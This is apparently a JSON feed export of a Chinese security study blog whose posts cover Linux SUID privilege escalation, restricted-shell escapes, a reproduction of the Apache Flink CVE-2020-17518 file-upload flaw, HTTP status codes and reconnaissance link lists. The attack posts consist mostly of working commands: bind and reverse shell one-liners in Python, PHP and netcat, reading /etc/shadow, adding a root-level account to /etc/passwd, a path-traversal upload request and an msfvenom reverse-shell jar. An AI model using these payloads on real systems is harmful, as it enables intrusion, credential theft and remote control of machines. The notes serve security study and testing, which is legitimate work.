{
    "version": "https://jsonfeed.org/version/1",
    "title": "凌晨的信息安全之路",
    "subtitle": "Avenue-le",
    "icon": "http://avenue.cool/images/favicon.ico",
    "description": "凌晨的信息安全之路 & 随学",
    "home_page_url": "http://avenue.cool",
    "items": [
        {
            "id": "http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/",
            "url": "http://avenue.cool/Increase-authority/linux%20SUID%20%E6%8F%90%E6%9D%83/",
            "title": "linux SUID 提权",
            "date_published": "2021-02-02T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"简单介绍一下概念\"><a class=\"anchor\" href=\"#简单介绍一下概念\">#</a> 简单介绍一下概念</h1><p>SUID（设置用户 ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有 SUID 权限，那么就可以利用系统中的二进制文件和工具来进行 root 提权。</p><p>已知的可用来提权的 linux 可行性的文件列表如下：<br><code>Nmap、Vim、find、Bash、More、Less、Nano、cp</code></p><p>以下命令可以发现系统上运行的所有 SUID 可执行文件。具体来说，命令将尝试查找具有 root 权限的 SUID 的文件。</p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null\nfind / -perm -u=s -type f 2&gt;/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} \\;\n</code></pre><p>因为它们的权限中包含 &quot;s&quot;，并且对应的是 root 权限。</p><pre><code>ls -l /usr/bin/nmap\n-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap\n</code></pre><h2 id=\"nmap\"><a class=\"anchor\" href=\"#nmap\">#</a> NMAP</h2><p>较旧版本的 Nmap（2.02 至 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 在使用 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</p><p><code>nmap -V</code></p><p>交互模式可以通过执行 Nmap 参数 &quot;interactive&quot;</p><p><code>nmap --interactive</code><br>Nmap - 交互模式<br>以下命令将提供一个提升的 shell。</p><pre><code>nmap&gt; !sh\nsh-3.2# whoami\nroot\n</code></pre><p>提权至 Root 权限，也可以通过 Metasploit 模块对 Nmap 的二进制文件进行权限提升。<br>exploit/unix/local/setuid_nmap</p><h2 id=\"find\"><a class=\"anchor\" href=\"#find\">#</a> Find</h2><p>如果 Find 命令也是以 Suid 权限运行的话，则将通过 find 执行的所有命令都会以 root 权限执行。</p><pre><code>touch pentestlab\nfind pentestlab -exec whoami \\;\n</code></pre><p>Find 命令权限提升<br>大部分 Linux 操作系统都安装了 netcat，因此也可以被利用来将权限提升至 root。</p><pre><code>find pentestlab -exec netcat -lvp 5555 -e /bin/sh \\;\n</code></pre><p>通过 Find 运行 Netcat，连接上去就会直接获取到一个 Root 权限的 shell。</p><pre><code>netcat 192.168.1.189 5555\nid\ncat /etc/shadow\n</code></pre><h2 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> VIM</h2><p>Vim 是 Linux 环境下的一款文件编辑器。但是，如果以 SUID 运行的话，它会继承 root 用户的权限，因此可以读取系统上的所有文件。<br>Vim - Root 权限的 shell</p><pre><code>vim.tiny /etc/shadow\nvim.tiny\n Press ESC key\n:set shell=/bin/sh\n:shell\n</code></pre><h2 id=\"bash\"><a class=\"anchor\" href=\"#bash\">#</a> Bash</h2><p>以下命令将以 root 权限打开一个 bash shell。</p><pre><code>bash -p\nbash-3.2# id\nuid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)\n</code></pre><h2 id=\"less\"><a class=\"anchor\" href=\"#less\">#</a> Less</h2><p>Less 和 More 都执行以用来提权。</p><pre><code>less /etc/passwd\n!/bin/sh\nmore /home/pelle/myfile\n!/bin/bash\n</code></pre><h2 id=\"cp\"><a class=\"anchor\" href=\"#cp\">#</a> cp</h2><p>使用 cp 覆盖 /etc/shadow</p><h2 id=\"mv\"><a class=\"anchor\" href=\"#mv\">#</a> mv</h2><p>使用 mv 覆盖 /etc/shadow 或者 /etc/sudoers</p><h2 id=\"tcpdump\"><a class=\"anchor\" href=\"#tcpdump\">#</a> tcpdump</h2><pre><code>echo $'id\\ncat /etc/shadow' &gt; /tmp/.test\nchmod +x /tmp/.test\nsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root\n</code></pre><h2 id=\"perl\"><a class=\"anchor\" href=\"#perl\">#</a> perl</h2><p>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且 UID 设置为 0，将其添加到 /etc/passwd 文件中。<br>首先，使用 perl 语言生成带有盐值的密码：</p><pre><code>perl -le 'print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)' \n</code></pre><p>然后执行下面这条命令，成功将 test 用户的信息加入 /etc/passwd 文件</p><pre><code>echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd\n</code></pre><h2 id=\"awk\"><a class=\"anchor\" href=\"#awk\">#</a> awk</h2><pre><code>awk 'BEGIN{system(&quot;whoami&quot;)}'\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/",
            "url": "http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/",
            "title": "linux rbash绕过",
            "date_published": "2021-02-02T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"什么是rbash\"><a class=\"anchor\" href=\"#什么是rbash\">#</a> 什么是 rbash？</h1><p>受限 shell 是 LinuxShell 限制一些 bash shell 中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限 shell 中运行。 它为 Linux 中的 bash shell 提供了一个额外的安全层。</p><p>但以下情况是不允许 rbash 执行的：</p><ul><li>使用命令 cd 更改目录</li><li>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）</li><li>指定包含参数 '/' 的文件名</li><li>指定包含参数 ' - ' 的文件名</li><li>使用重定向输出 '&gt;', '&gt;&gt;', '&gt; |', '&lt;&gt;' '&gt;&amp;','&amp;&gt;'</li><li>大致的限制如上</li></ul><p>那么我们如果在实际环境中，如果想要对环境进行进一步的操作，那么 rbash 肯定是不符合要求的，所以才有了 “绕过” 这一行为<br>而因为 rbash 的特殊性问题，绕过的方法，大多都是通过 Linux 机器上现有的软件，来执行一个没有限制的 shell 回来使用</p><p>创建限制 shell 的用户<br>在 RHEL 和 Centos 的系统中，rbash 不能直接实现，所以在开始之前，我们需要通过 ln-s 来建立一个软连接</p><pre><code>cd  /bin\nln -s bash rbash\n</code></pre><p>然后创建用户的时候，在设置用户是以 /bin/rbash 来启动的 shell</p><p><code>useradd -s /bin/rbash hack</code></p><h1 id=\"rbash-绕过方法\"><a class=\"anchor\" href=\"#rbash-绕过方法\">#</a> rbash 绕过方法</h1><h2 id=\"bash_cmdsabinsha-把binbash给a变量\"><a class=\"anchor\" href=\"#bash_cmdsabinsha-把binbash给a变量\">#</a> BASH_CMDS [a]=/bin/sh;a #把 /bin/bash 给 a 变量</h2><pre><code>/bin/bash                  \necho $0   #查看脚本本身的名字\necho $?    #命令执行结果反馈，0代表执行成功，其余数字表示不成功\nexport PATH=$PATH:/bin/    #将/bin 作为PATH环境变量导出\nexport PATH=$PATH:/usr/bin   #将/usr/bin作为PATH环境变量导出\n</code></pre><p>执行完上面加粗的四步之后就可以执行所有命令了</p><h2 id=\"vi-命令可以使用可以使用vi-获取到一个-bash\"><a class=\"anchor\" href=\"#vi-命令可以使用可以使用vi-获取到一个-bash\">#</a> vi 命令可以使用，可以使用 vi 获取到一个 bash</h2><pre><code>vim  test\nPress ESC key\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/sbin:/usr/bin:/sbin:/bin  添加全局环境变量\n</code></pre><p>PATH 就是定义 /bin:/sbin:/usr/bin 等这些路径的变量，其中冒号为目录间的分割符。</p><h2 id=\"使用python-突破shell-限制\"><a class=\"anchor\" href=\"#使用python-突破shell-限制\">#</a> 使用 python 突破 shell 限制</h2><pre><code>python -c &quot;import os;os.system('whoami')&quot;\npython -c &quot;import os;os.system('/bin/sh')&quot;\npython -c &quot;import pty;pty.spawn('/bin/sh')&quot;\n</code></pre><h2 id=\"ed-编辑器\"><a class=\"anchor\" href=\"#ed-编辑器\">#</a> ED - 编辑器</h2><pre><code>ed\n! '/bin/sh'\n</code></pre><h2 id=\"perl\"><a class=\"anchor\" href=\"#perl\">#</a> Perl</h2><p><code>perl -e 'system(&quot;/bin/sh&quot;);'</code></p><h2 id=\"通过ssh绕过rbash\"><a class=\"anchor\" href=\"#通过ssh绕过rbash\">#</a> 通过 SSH 绕过 rbash</h2><p>如果您知道属于 rbash shell 的用户的 ssh 凭据，则可以在 ssh 上使用以下命令来破解监狱，并通过访问适当的 bash shell 绕过 rbash。<br><code>ssh ignite@192.168.1.103 -t &quot;bash --noprofile&quot;</code></p><h2 id=\"使用expect绕过rbash\"><a class=\"anchor\" href=\"#使用expect绕过rbash\">#</a> 使用 Expect 绕过 rbash</h2><p>Expect 是一个 Unix 程序，可以根据脚本与其他交互式程序 “对话”。在脚本之后，Expect 知道程序可以期望什么，正确的响应应该是什么。</p><pre><code>expect\nspwan sh\nsh\n</code></pre><h2 id=\"man-绕过rbash\"><a class=\"anchor\" href=\"#man-绕过rbash\">#</a> man 绕过 rbash</h2><pre><code>man man\n!'sh'\n</code></pre><h2 id=\"通过反向shell绕过rbash\"><a class=\"anchor\" href=\"#通过反向shell绕过rbash\">#</a> 通过反向 Shell 绕过 rbash</h2><p>您也可以选择反向 shellcode 绕过 rbash，这里我们使用 python 反向 shellcode（penetestmokey），这会将 “sh：Bourne shell” 扔到正在监听的 netcat 上的监听机器（在本例中为 Kali Linux）我们的 Kali Linux。<br><code>nc -lvp 1234</code><br>运行侦听器后，我们将运行以下命令。<br><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;LISTENING IP&quot;,LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><pre><code>php -r '$sock=fsockopen(&quot;LISTENING IP&quot;,LISTENING PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'\n</code></pre><!-- rebuild by hrmmi -->",
            "tags": [
                "提权知识",
                "提权知识"
            ]
        },
        {
            "id": "http://avenue.cool/2020-2021-CVE/apache-Flink_CVE-2020-17518/",
            "url": "http://avenue.cool/2020-2021-CVE/apache-Flink_CVE-2020-17518/",
            "title": "Apache-Flink_CVE-2020-17518",
            "date_published": "2021-02-01T09:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h1 id=\"apache-flink文件上传\"><a class=\"anchor\" href=\"#apache-flink文件上传\">#</a> Apache Flink 文件上传</h1><h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 【原理】</h2><p>Apache Flink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和流水线方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。Flink 在 1.5.1 版本中引入了一个 REST handler，这允许攻击者将已上传的文件写入本地任意位置的文件中，并且可通过一个恶意修改的 HTTP 头将这些文件写入到 Flink 1.5.1 可以访问的任意位置。</p><h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 【工具】</h2><ul><li>浏览器</li></ul><h2 id=\"步骤\"><a class=\"anchor\" href=\"#步骤\">#</a> 【步骤】</h2><p>访问：http://your-ip:8081 进入 Apache Flink 控制面板：</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/1.png\" alt=\"\"></p><p>打开 BUrp 构造 POC，上传文件</p><pre><code>\nPOST /jars/upload HTTP/1.1\nHost: 192.168.243.189:8081\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------13247690941547071692111317477\nContent-Length: 250\nOrigin: http://192.168.243.189:8081\nConnection: close\nReferer: http://192.168.243.189:8081/\n\n-----------------------------13247690941547071692111317477\nContent-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/success&quot;\nContent-Type: text/plain\n\n\nsuccess\n-----------------------------13247690941547071692111317477-\n\n</code></pre><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/2.png\" alt=\"\"></p><p>此时，我们利用之前的任意文件读取漏洞，读取我们上传的文件，查看是否上传成功。</p><pre><code>http://192.168.243.189:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fsuccess\n\n</code></pre><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/3.png\" alt=\"\"></p><p>我们还可以上传 jar 马实现反弹监听从而远程命令执行</p><p>首先我们使用 kali 的 MSF 生成 jar 马：</p><pre><code>msfvenom -p java/shell_reverse_tcp lhost=192.168.243. lport=5555 -f jar &gt;/home/kali/Desktop/shell.jar\n</code></pre><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/4.png\" alt=\"\"></p><p>然后本地机器新建命令行窗口，使用 nc 进行端口监听：</p><p>nc -lvvp 5555</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/5.png\" alt=\"\"></p><p>最后把生成的 jar 马通过 Submit New Job 模块进行上传：</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/6.png\" alt=\"\"></p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/7.png\" alt=\"\"></p><p>点击 Submit 即可实现 jar 马反弹监听：</p><p>可以执行远程命令：</p><p><img data-src=\"/images/apache-Flink_CVE-2020-17518/8.png\" alt=\"\"></p><!-- rebuild by hrmmi -->",
            "tags": [
                "2020-2021-CVE漏洞复现",
                "2020-2021-CVE漏洞复现"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/",
            "url": "http://avenue.cool/WEB/Web-Foundation/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/",
            "title": "4. WEB HTTP 状态码",
            "date_published": "2020-09-06T02:31:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"常见的状态码含义\"><a class=\"anchor\" href=\"#常见的状态码含义\">#</a> 常见的状态码含义：</h2><p>100 继续 ： 服务器返回此代码已收到请求的第一部分，正在等待其他部分。<br>101 切换协议： 请求者要求服务器切换协议，服务器已确认并准备切换。<br>200 成功：表示客户端发来的请求在服务器端被正常处理了。<br>301 永久移动：请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。<br>302 临时移动：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求<br>400 Bad Request：表示请求报文中存在语法错误。<br>401 Unauthorized：表示发送的请求需要有通过 HTTP 认证的信息。<br>403 Forbidden：表明对请求资源的访问被服务器拒绝了。<br>404 Not Found：服务器无法找到请求的资源。<br>405 方法禁用：禁用请求中的方法。<br>408 请求超时： 服务器登后请求时发生超时。<br>500 Internal Server Error：表明服务器端在执行请求时发生了错误。<br>502 错误网关： 服务器作为网关或代理，从上游服务器收到无效响应。<br>503 Service Unavailable：表明服务器暂时处于超负载或进行停机维护<br>504 网关超时：服务器作为网关或代理，但是没有及时从上游服务器收到请求。<br>505 HTTP 版本不受支持：<br>服务器不支持请求中所用的 HTTP 协议版本。</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "WEB基础知识",
                "WEB基础知识"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/",
            "url": "http://avenue.cool/WEB/Information-Gathering/2.%20%E6%94%B6%E9%9B%86%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/",
            "title": "2. 收集域名信息",
            "date_published": "2020-09-06T02:31:20.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><p>知道目标域名之后，我们要做的第一件事情就是获取域名的注册信息，包括该域名的 DNS 服务器信息和注册人的联系信息等。</p><h2 id=\"whois-查询\"><a class=\"anchor\" href=\"#whois-查询\">#</a> whois 查询</h2><pre><code>Whois 是一个标准的互联网协议，可以用于收集网络注册信息，注册的域名、IP地址等信息。在Whois查询中，得到注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所属人往往就是管理员。kali中已经默认安装了whois。whois + 域名\n</code></pre><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FsaS5vcmcvZG93bmxvYWRzLw==\">Kali 下 whois 查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3dob2lzLmNoaW5hei5jb20v\">域名 Whois 查询 - 站长之家</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==\">Whois - 爱站</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=\">IP-38</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2hvaXMubmV0Lw==\">Whois Lookup</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb29rdXAuaWNhbm4ub3JnLw==\">ICANN Lookup</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS9kb21haW4/ZG9tYWluPQ==\">域名信息查询 - 腾讯云</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3dob2lzLnhpbm5ldC5jb20v\">新网 whois 信息查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9pcHdob2lzLw==\">IP WHOIS 查询 - 站长工具</span></li></ul><h2 id=\"备案信息查询\"><a class=\"anchor\" href=\"#备案信息查询\">#</a> 备案信息查询</h2><pre><code>网站备案是根据国家法律规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。\n</code></pre><ul><li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iZWlhbmJlaWFuLmNvbS8=\">ICP 备案查询网</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL2ljcC5jaGluYXouY29tLw==\">ICP 备案查询 - 站长工具</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWl6aGFuLmNvbS9zZW8v\">SEO 综合查询 - 爱站</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL2ljcC5jaGluYXouY29tL3NlYXJjaHM=\">批量查询 - 站长工具</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=\">工业和信息化部 ICP/IP/ 域名信息备案管理</span></li></ul><h2 id=\"企业信用信息查询\"><a class=\"anchor\" href=\"#企业信用信息查询\">#</a> 企业信用信息查询</h2><pre><code>企业信用指一家第三方征信机构通过征集另一家企业信息，根据征信机构的信用评级规则，评价出的企业信用等级。\n</code></pre><ul><li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s\">国家企业信用信息公示系统</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb21wYW55LnhpemhpLmNvbS8=\">悉知 - 全国企业信息查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3JlZGl0Y2hpbmEuZ292LmNuLw==\">信用中国 - 个人信用查询搜索 - 企业信息查询搜索</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v\">天眼查</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucWljaGFjaGEuY29tLw==\">企查查</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueGlhb2xhbmJlbi5jb20v\">小蓝本</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucWl4aW4uY29tLw==\">启信宝</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aW4uYmFpZHUuY29tLw==\">百度企业信用</span></li></ul><h2 id=\"浏览器插件\"><a class=\"anchor\" href=\"#浏览器插件\">#</a> 浏览器插件</h2><p>通过 Google、FireFox 等插件的使用，收集域名信息</p><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "信息收集",
                "信息收集"
            ]
        },
        {
            "id": "http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "http://avenue.cool/WEB/Information-Gathering/%7F3.%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "3. 子域名信息收集",
            "date_published": "2020-09-06T02:31:20.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><div class=\"note info\"><p>以下为个人学习笔记和习题整理</p></div><h2 id=\"收集子域名信息\"><a class=\"anchor\" href=\"#收集子域名信息\">#</a> 收集子域名信息</h2><p>主域名是由两个或两个以上字母构成，中间由点号隔开，这个域名只有一个点号，子域名是顶级域名的下一级，域名整体包含两个 “.” 号。</p><p>子域名也就是二级域名，是指顶级域名下的域名。假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。那么问题来了，怎样才能尽可能多地搜集目标的高价值子域呢？常用的方法有以下这几种。</p><h3 id=\"常见子域名的收集方法\"><a class=\"anchor\" href=\"#常见子域名的收集方法\">#</a> 常见子域名的收集方法：</h3><p>（1） Web 子域名猜测与实际访问尝试<br>（2） 搜索引擎查询主域名地址<br>（3）查询 DNS 解析记录<br>（4） 基于 DNS 查询的暴力破解<br>（5）手工分析（查看主站页面及相关页面）</p><h3 id=\"在线平台查询\"><a class=\"anchor\" href=\"#在线平台查询\">#</a> 在线平台查询</h3><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=\">ip138</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zdWJkb21haW4vP2RvbWFpbj0v\">站长工具</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=\">hackertarget</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==\">t1h2ua</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v\">dnsdumpster</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kLmNoaW5hY3ljYy5jb20vaW5kZXgucGhwP209TG9naW4mYW1wO2E9aW5kZXg=\">chinacycc</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v\">dnsdumpster</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3ouemNqdW4uY29tLw==\">zcjun</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy55dW02LmNuL1Rvb2xzL3VybGJsYXN0Lw==\">tools.yum6.cn</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vc3ViZG9tYWluLw==\">tools.bugscaner</span></li></ul><h3 id=\"ip反查绑定域名网站\"><a class=\"anchor\" href=\"#ip反查绑定域名网站\">#</a> IP 反查绑定域名网站</h3><p>IP 关联域名，大部分网站一个 IP 多个域名</p><ul><li><span class=\"exturl\" data-url=\"aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWU/cw==\">站长之家</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=\">爱站</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=\">webscan</span></li><li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy4xMTRiZXN0LmNvbS9pcC8=\">同 IP 网站查询</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXZlcnNlaXAuZG9tYWludG9vbHMuY29tLw==\">反向 IP 查询</span></li></ul><h3 id=\"资产搜索引擎\"><a class=\"anchor\" href=\"#资产搜索引擎\">#</a> 资产搜索引擎</h3><p>google、shodan、FOFA、zoomeye</p><h3 id=\"工具枚举\"><a class=\"anchor\" href=\"#工具枚举\">#</a> 工具枚举</h3><p>常用子域名工具如下（Github 上都可搜到）</p><ol><li>OneForAll<br>OneForAll 是一款功能强大的子域收集工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域 IP、子域常用端口、子域 Title、子域 Banner、子域状态等。</li></ol><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=\">项目地址</span><br>子域名收集： python3 <span class=\"exturl\" data-url=\"aHR0cDovL29uZWZvcmFsbC5weQ==\">oneforall.py</span> --target=<span class=\"exturl\" data-url=\"aHR0cDovL3RhcmdldC5jb20=\">target.com</span> run</p><ol start=\"2\"><li><p>Layer<br>Layer 子域名挖掘机的使用方法比较简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、开放端口、Web 服务器和网站状态等</p></li><li><p>subDomainsBrute<br>subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名。<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==\">项目地址</span><br>子域名收集：python <span class=\"exturl\" data-url=\"aHR0cDovL3N1YkRvbWFpbnNicnV0ZS5weQ==\">subDomainsbrute.py</span> <span class=\"exturl\" data-url=\"aHR0cDovL3h0YXJnZXQuY29t\">xtarget.com</span></p></li></ol><h3 id=\"证书透明度公开日志枚举\"><a class=\"anchor\" href=\"#证书透明度公开日志枚举\">#</a> 证书透明度公开日志枚举</h3><p>证书透明度 (Certificate Transparency, CT) 是证书授权机构 (CA) 的一个项目，证书授权机构会将每个 SSL/TLS 证书发布到公共日志中。一个 SSL/TLS 证书通常包含域名、子域名和邮件地址， 这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引 | 擎搜索一些公开的 CT 日志。</p><p>在线第三方平台查询</p><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcnQuc2gv\">crt.sh</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZW5zeXMuaW8v\">censys</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9teXNzbC5jb20v\">myssl</span></li></ul><h3 id=\"ns历史解析\"><a class=\"anchor\" href=\"#ns历史解析\">#</a> NS 历史解析</h3><ul><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZG5zZGIuaW8v\">dnsdb</span></li><li><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWV3ZG5zLmluZm8v\">viewdns</span></li></ul><!-- rebuild by hrmmi -->",
            "tags": [
                "WEB安全知识",
                "信息收集",
                "信息收集"
            ]
        },
        {
            "id": "http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/",
            "url": "http://avenue.cool/Intranet/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/",
            "title": "内网安全知识",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><p>内网安全知识</p><!-- rebuild by hrmmi -->",
            "tags": [
                "内网安全知识",
                "内网安全知识"
            ]
        },
        {
            "id": "http://avenue.cool/Linux/Linux/",
            "url": "http://avenue.cool/Linux/Linux/",
            "title": "Linuxdf",
            "date_published": "2020-09-06T02:30:59.000Z",
            "content_html": "<!-- build time:Tue Feb 02 2021 10:50:12 GMT+0800 (中国标准时间) --><p>linux</p><!-- rebuild by hrmmi -->",
            "tags": [
                "Linux运维",
                "Linux运维"
            ]
        },
        {
